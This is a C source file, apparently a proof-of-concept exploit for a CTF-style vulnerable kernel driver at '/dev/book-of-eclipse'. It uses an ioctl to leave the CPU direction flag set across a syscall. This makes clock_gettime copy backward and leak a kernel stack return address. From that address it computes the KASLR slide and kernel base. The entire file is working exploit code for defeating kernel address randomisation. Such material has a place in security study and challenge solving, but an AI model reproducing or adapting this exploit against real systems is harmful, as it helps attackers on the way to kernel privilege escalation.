#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define ECLIPSE_IOCTL 0x41004500UL
#define DF_BIT 10U
#define KERNEL_LINK_BASE 0xffffffff81000000ULL
#define RETURN_AFTER_COPY 0xffffffff81143a89ULL

static inline long syscall_with_df(long num, long arg1, long arg2) {
    long result;
    __asm__ volatile (
        "std\n\t"
        "syscall\n\t"
        "cld\n\t"
        : "=a"(result)
        : "0"(num), "D"(arg1), "S"(arg2)
        : "rcx", "r11", "memory", "cc"
    );
    return result;
}

int main(void) {
    int fd = open("/dev/book-of-eclipse", O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        perror("open /dev/book-of-eclipse");
        return 1;
    }

    uint8_t command[256] = {0};
    uint32_t bit = DF_BIT;
    memcpy(command, &bit, sizeof(bit));
    int result = ioctl(fd, ECLIPSE_IOCTL, command);
    if (result < 0) {
        fprintf(stderr, "ioctl 0x%lx (bit %u) failed: %s\n",
                ECLIPSE_IOCTL, DF_BIT, strerror(errno));
        close(fd);
        return 2;
    }
    close(fd);
    fprintf(stderr, "[+] FMASK bit %u toggled; testing DF inheritance\n", DF_BIT);

    // A 16-byte backward usercopy from the kernel stack is expected to
    // reveal the return address just below the two-field timespec source.
    unsigned char *region = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) {
        perror("mmap");
        return 3;
    }
    memset(region, 0xa5, 4096);
    unsigned char *dst = region + 2048;

    long ret = syscall_with_df(SYS_clock_gettime, CLOCK_REALTIME,
                               (long)(uintptr_t)dst);
    printf("[+] clock_gettime with DF=1 returned %ld\n", ret);
    if (ret < 0) {
        fprintf(stderr, "[!] kernel returned %ld; leak not confirmed\n", ret);
        munmap(region, 4096);
        return 4;
    }

    printf("[+] bytes preceding destination:\n");
    for (int i = -32; i < 16; i++) {
        if (i % 8 == 0) printf("\n%+4d: ", i);
        printf("%02x ", dst[i]);
    }
    putchar('\n');

    uint64_t rip = 0;
    memcpy(&rip, dst - 8, sizeof(rip));
    printf("[+] candidate return address: 0x%016" PRIx64 "\n", rip);
    if ((rip & 0xffffffff00000000ULL) != 0xffffffff00000000ULL) {
        fprintf(stderr, "[!] No canonical high-half pointer at dst-8\n");
        munmap(region, 4096);
        return 5;
    }

    uint64_t slide = rip - RETURN_AFTER_COPY;
    uint64_t base = KERNEL_LINK_BASE + slide;
    printf("[+] inferred KASLR slide: 0x%016" PRIx64 "\n", slide);
    printf("[+] inferred kernel base: 0x%016" PRIx64 "\n", base);
    if ((slide & 0x1fffffULL) != 0) {
        fprintf(stderr, "[!] Leak does not match expected callsite at 0x%016llx\n",
                (unsigned long long)RETURN_AFTER_COPY);
        munmap(region, 4096);
        return 6;
    }
    printf("[+] KASLR_LEAK_CANDIDATE (verify in target VM)\n");
    munmap(region, 4096);
    return 0;
}
